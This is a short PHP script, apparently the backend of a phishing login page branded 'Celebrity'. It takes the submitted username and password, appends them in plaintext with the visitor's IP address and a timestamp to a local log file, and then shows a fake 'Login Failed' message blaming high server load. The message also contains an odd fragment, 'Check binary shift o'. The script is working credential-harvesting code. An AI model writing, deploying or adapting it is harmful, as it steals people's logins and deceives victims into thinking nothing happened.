<?php
// MyPortal.php

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");

// Define the log file in the same directory as these PHP files
$logFile = __DIR__ . '/login_attempts.log';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $dateTime = date('Y-m-d H:i:s');

    // Construct the log entry
    $logEntry = "[$dateTime] IP: $ipAddress | Username: $username | Password: $password\n";

    // Append credentials to the log file
    file_put_contents($logFile, $logEntry, FILE_APPEND);

    // Show a confirmation page or redirect back
    echo "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>Logged</title></head><body>";
    echo "<h1>Login Failed</h1>";
    echo "<p>Thank you for choosing Celebrity. Our servers are currently experiencing high load. Please be patient, as requests may take longer than usual to process.(error EK.806) Check binary shift o</p>";
    echo "<p><a href='index.php'>Go Back</a></p>";
    echo "</body></html>";
    exit;
} else {
    // If accessed directly, just redirect to index.
    header("Location: index.php");
    exit;
}
